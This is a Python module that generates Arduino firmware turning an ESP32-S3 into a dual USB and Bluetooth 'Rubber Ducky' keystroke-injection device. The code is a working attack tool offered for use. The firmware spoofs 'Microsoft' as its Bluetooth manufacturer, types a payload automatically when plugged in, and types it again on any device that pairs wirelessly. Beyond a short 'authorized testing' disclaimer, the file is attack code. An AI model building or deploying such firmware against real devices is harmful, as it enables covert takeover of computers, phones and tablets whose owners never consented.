"""
Dual-Mode (USB + BLE) Arduino Code Generator
Generates a sketch that runs BOTH USB HID and Bluetooth HID simultaneously.
The ESP32-S3 appears as a wired keyboard on USB AND a wireless keyboard on Bluetooth.

Attack scenarios:
  - Plug in via USB -> instant payload on the host machine
  - Pair via BLE   -> payload on a nearby phone/tablet/laptop
  - Both at once   -> dual-target attack
"""

from typing import List
from compiler.duckyscript_parser import Command
from compiler.keycodes import MODIFIERS, SPECIAL_KEYS
from compiler.ble_generator import BLE_MODIFIERS, BLE_SPECIAL_KEYS


class DualModeGenerator:
    """Generate an ESP32-S3 sketch that acts as both USB and BLE keyboard."""

    HEADER = '''\
/*
 * ESP32-S3 DUAL MODE Rubber Ducky (USB + Bluetooth)
 * Auto-generated by esp32-ducky toolkit
 *
 * IMPORTANT: For authorized security testing and education ONLY.
 *
 * This firmware runs TWO attack vectors simultaneously:
 *   1. USB HID Keyboard  - payload on plug-in (wired)
 *   2. BLE HID Keyboard  - payload on BLE pair (wireless)
 *
 * SETUP:
 *   1. Install "ESP32 BLE Keyboard" library by T-vK
 *   2. Board: ESP32S3 Dev Module
 *   3. USB Mode: USB-OTG (TinyUSB)
 *   4. USB CDC On Boot: Disabled
 *
 * BLE device name: "{device_name}"
 */

#include "USB.h"
#include "USBHIDKeyboard.h"
#include "USBHIDMouse.h"
#include <BleKeyboard.h>
#include <BleMouse.h>

// ---- CONFIGURATION ----
#define BLE_DEVICE_NAME     "{device_name}"
#define BLE_MANUFACTURER    "Microsoft"
#define BLE_BATTERY         80

USBHIDKeyboard usbKeyboard;
USBHIDMouse usbMouse;
BleKeyboard bleKeyboard(BLE_DEVICE_NAME, BLE_MANUFACTURER, BLE_BATTERY);
BleMouse bleMouse(BLE_DEVICE_NAME, BLE_MANUFACTURER, BLE_BATTERY);

#ifndef LED_BUILTIN
#define LED_BUILTIN 2
#endif

#define TRIGGER_PIN 0

bool usbPayloadDone = false;
bool blePayloadDone = false;

// ==========================================
//  USB Keyboard helpers
// ==========================================
void usbTypeString(const char* str) {{
  for (int i = 0; str[i] != '\\0'; i++) {{
    usbKeyboard.press(str[i]);
    delay(5);
    usbKeyboard.release(str[i]);
    delay(5);
  }}
}}

// ==========================================
//  BLE Keyboard helpers
// ==========================================
void bleTypeString(const char* str) {{
  for (int i = 0; str[i] != '\\0'; i++) {{
    bleKeyboard.press(str[i]);
    delay(8);
    bleKeyboard.release(str[i]);
    delay(8);
  }}
}}

void setup() {{
  Serial.begin(115200);
  pinMode(LED_BUILTIN, OUTPUT);
  pinMode(TRIGGER_PIN, INPUT_PULLUP);

  // Start USB HID
  usbKeyboard.begin();
  usbMouse.begin();
  USB.begin();
  Serial.println("[*] USB HID Keyboard & Mouse started");

  // Start BLE
  bleKeyboard.begin();
  bleMouse.begin();
  Serial.println("[*] BLE Keyboard started as: {device_name}");
  Serial.println("[*] Waiting for connections...");

  // Wait for USB enumeration
  delay(1500);

  // Execute USB payload immediately
  Serial.println("[+] Running USB payload...");
  digitalWrite(LED_BUILTIN, HIGH);
  executePayloadUSB();
  usbPayloadDone = true;
  digitalWrite(LED_BUILTIN, LOW);
  Serial.println("[+] USB payload complete.");
}}

void loop() {{
  // BLE: execute when a device pairs
  if (bleKeyboard.isConnected() && !blePayloadDone) {{
    Serial.println("[+] BLE device connected! Running BLE payload...");
    delay(800);
    digitalWrite(LED_BUILTIN, HIGH);
    executePayloadBLE();
    blePayloadDone = true;
    digitalWrite(LED_BUILTIN, LOW);
    Serial.println("[+] BLE payload complete.");

    for (int i = 0; i < 3; i++) {{
      digitalWrite(LED_BUILTIN, HIGH);
      delay(100);
      digitalWrite(LED_BUILTIN, LOW);
      delay(100);
    }}
  }}

  // Reset BLE flag when device disconnects
  if (!bleKeyboard.isConnected()) {{
    blePayloadDone = false;
  }}

  // Re-trigger both on button press
  if (digitalRead(TRIGGER_PIN) == LOW) {{
    delay(500);
    Serial.println("[*] Re-running payloads...");
    executePayloadUSB();
    if (bleKeyboard.isConnected()) {{
      executePayloadBLE();
    }}
    delay(2000);
  }}
}}
'''

    FOOTER = '''\
}
'''

    def __init__(self, device_name: str = "Wireless Keyboard"):
        self.indent = "  "
        self.device_name = device_name

    def generate(self, commands: List[Command], default_delay: int = 0) -> str:
        """Generate dual-mode sketch with both USB and BLE payload functions."""
        lines = []
        header = self.HEADER.replace("{device_name}", self.device_name)
        lines.append(header)

        # USB payload function
        lines.append("// ==========================================")
        lines.append("//  USB PAYLOAD")
        lines.append("// ==========================================")
        lines.append("void executePayloadUSB() {")
        lines.extend(self._gen_payload(commands, default_delay, mode="usb"))
        lines.append("}")
        lines.append("")

        # BLE payload function
        lines.append("// ==========================================")
        lines.append("//  BLE PAYLOAD")
        lines.append("// ==========================================")
        lines.append("void executePayloadBLE() {")
        lines.extend(self._gen_payload(commands, default_delay, mode="ble"))
        lines.append("}")
        lines.append("")

        return "\n".join(lines)

    def _gen_payload(self, commands: List[Command], default_delay: int, mode: str) -> List[str]:
        """Generate payload body for either USB or BLE mode."""
        kb = "usbKeyboard" if mode == "usb" else "bleKeyboard"
        ts = "usbTypeString" if mode == "usb" else "bleTypeString"
        mod_map = MODIFIERS if mode == "usb" else BLE_MODIFIERS
        key_map = SPECIAL_KEYS if mode == "usb" else BLE_SPECIAL_KEYS

        lines = []
        prev_cmd = None

        for cmd in commands:
            if default_delay > 0 and prev_cmd is not None:
                lines.append(f"{self.indent}delay({default_delay});")

            if cmd.cmd_type == "delay":
                lines.append(f"{self.indent}delay({cmd.delay_ms});")

            elif cmd.cmd_type == "default_delay":
                default_delay = cmd.delay_ms

            elif cmd.cmd_type == "string":
                escaped = self._escape_string(cmd.value)
                lines.append(f'{self.indent}{ts}("{escaped}");')

            elif cmd.cmd_type == "stringln":
                escaped = self._escape_string(cmd.value)
                lines.append(f'{self.indent}{ts}("{escaped}");')
                lines.append(f"{self.indent}{kb}.press(KEY_RETURN);")
                lines.append(f"{self.indent}delay(10);")
                lines.append(f"{self.indent}{kb}.release(KEY_RETURN);")

            elif cmd.cmd_type == "mouse_move":
                mouse_obj = "usbMouse" if mode == "usb" else "bleMouse"
                lines.append(f"{self.indent}{mouse_obj}.move({cmd.mouse_x}, {cmd.mouse_y});")
                lines.append(f"{self.indent}delay(20);")

            elif cmd.cmd_type == "mouse_click":
                mouse_obj = "usbMouse" if mode == "usb" else "bleMouse"
                btn = "MOUSE_LEFT" if cmd.mouse_button == "LEFT" else ("MOUSE_RIGHT" if cmd.mouse_button == "RIGHT" else "MOUSE_MIDDLE")
                lines.append(f"{self.indent}{mouse_obj}.click({btn});")
                lines.append(f"{self.indent}delay(50);")

            elif cmd.cmd_type == "mouse_scroll":
                mouse_obj = "usbMouse" if mode == "usb" else "bleMouse"
                lines.append(f"{self.indent}{mouse_obj}.move(0, 0, {cmd.mouse_wheel});")
                lines.append(f"{self.indent}delay(30);")

            elif cmd.cmd_type == "keypress":
                for key in cmd.keys:
                    kc = self._resolve_key(key, mod_map, key_map)
                    lines.append(f"{self.indent}{kb}.press({kc});")
                lines.append(f"{self.indent}delay(30);")
                for key in reversed(cmd.keys):
                    kc = self._resolve_key(key, mod_map, key_map)
                    lines.append(f"{self.indent}{kb}.release({kc});")

            elif cmd.cmd_type == "combo":
                for mod in cmd.modifiers:
                    lines.append(f"{self.indent}{kb}.press({mod_map[mod]});")
                for key in cmd.keys:
                    kc = self._resolve_key(key, mod_map, key_map)
                    lines.append(f"{self.indent}{kb}.press({kc});")
                lines.append(f"{self.indent}delay(30);")
                for key in reversed(cmd.keys):
                    kc = self._resolve_key(key, mod_map, key_map)
                    lines.append(f"{self.indent}{kb}.release({kc});")
                for mod in reversed(cmd.modifiers):
                    lines.append(f"{self.indent}{kb}.release({mod_map[mod]});")

            elif cmd.cmd_type == "repeat":
                if prev_cmd:
                    repeat_code = self._gen_single(prev_cmd, kb, ts, mod_map, key_map)
                    lines.append(f"{self.indent}for (int _r = 0; _r < {cmd.repeat_count}; _r++) {{")
                    for rc in repeat_code:
                        lines.append(f"{self.indent}  {rc}")
                    lines.append(f"{self.indent}}}")

            prev_cmd = cmd

        return lines

    def _gen_single(self, cmd, kb, ts, mod_map, key_map):
        lines = []
        if cmd.cmd_type == "string":
            lines.append(f'{ts}("{self._escape_string(cmd.value)}");')
        elif cmd.cmd_type == "keypress":
            for key in cmd.keys:
                kc = self._resolve_key(key, mod_map, key_map)
                lines.append(f"{kb}.press({kc});")
            lines.append("delay(30);")
            for key in reversed(cmd.keys):
                kc = self._resolve_key(key, mod_map, key_map)
                lines.append(f"{kb}.release({kc});")
        elif cmd.cmd_type == "delay":
            lines.append(f"delay({cmd.delay_ms});")
        return lines

    def _resolve_key(self, key, mod_map, key_map):
        upper = key.upper()
        if upper in mod_map:
            return mod_map[upper]
        if upper in key_map:
            return key_map[upper]
        if len(key) == 1:
            return f"'{key}'"
        raise ValueError(f"Unknown key: {key}")

    def _escape_string(self, s):
        return (
            s.replace("\\", "\\\\")
            .replace('"', '\\"')
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
        )
